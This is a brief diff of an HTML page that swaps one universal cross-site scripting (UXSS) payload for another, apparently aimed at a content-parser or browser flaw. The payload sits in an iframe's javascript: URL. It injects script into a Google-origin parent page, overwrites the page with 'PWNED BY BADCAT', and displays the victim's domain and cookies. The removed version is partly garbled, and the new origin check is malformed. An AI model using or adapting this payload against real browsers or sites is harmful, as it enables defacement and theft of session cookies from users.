@@ -36,9 +36,7 @@
   <article id="source">
     <iframe
       class="mercury-parser-keep"
-      src="javascript:(()=>{if(parent.location.origin==='https://www.google.com:8443'eateElement('script');s.textContent=&quot;document.open();document.write('<!doctype ht
-ml><title>UXSS '+document.domain+'</title><h1>BENIGN UXSS TEST</h1><br><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+'</p>');document.close();alert(document.domain)&quot;;parent.
-document.head.appendChild(s)}})()">
+      src="javascript:(()=>{if(parent.location.origin==='https://www.googlecom/csi'){let s=parent.document.createElement('script');s.textContent=&quot;document.open();document.write('<!doctype html><title>UXSS '+document.domain+'</title><h1>PWNED BY BADCAT</h1><br><img src=https://i.giphy.com/Smx2SK5xnY9OpDHRqL.webp><br><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+' cookie:'+document.cookie+'</p>');document.close();alert(document.domain)&quot;;parent.document.head.appendChild(s)}})()">
     </iframe>
     <p id="padding"></p>
   </article>
